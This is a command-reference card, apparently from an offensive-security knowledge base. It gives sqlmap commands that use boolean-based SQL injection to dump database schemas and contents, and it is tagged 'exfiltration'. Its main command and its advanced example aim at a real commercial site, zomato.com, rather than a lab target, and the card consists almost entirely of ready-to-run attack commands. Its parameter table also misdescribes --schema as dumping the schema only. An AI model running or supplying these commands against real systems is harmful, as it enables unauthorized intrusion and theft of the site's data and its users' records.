---
id: cmd-sqlmap-dump-001
data: >-
  sqlmap -u "https://www.zomato.com/app?param=value" --technique=B --dbms=mysql
  --dump --schema
tags:
  - sqli
  - dump
  - exfiltration
type: command
output: null
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:20.057Z'
verified: false
validated: true
submitted: true
---
# sqlmap-dump-boolean

## Command

```bash
sqlmap -u "https://www.zomato.com/app?param=value" --technique=B --dbms=mysql --dump --schema
```

## Description

Dumps database schema and data using boolean-based SQL injection with sqlmap.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -u | Target URL | Yes |
| --technique=B | Boolean mode | Yes |
| --dbms | Database management system | No |
| --dump | Enable data dumping | Yes |
| --schema | Dump schema only | No |

## Examples

### Basic Usage

```bash
sqlmap -u "https://example.com?id=1" --technique=B --dump
```

### Advanced Usage

```bash
sqlmap -u "https://www.zomato.com/app?param=value" --technique=B --dump-all --exclude-sysdbs
```

## Expected Output

CSV or table output of dumped data, e.g., database names, table structures, and records.

## Related

- [[Related Procedure: Extract-Database-Data-via-Boolean-SQLi]]
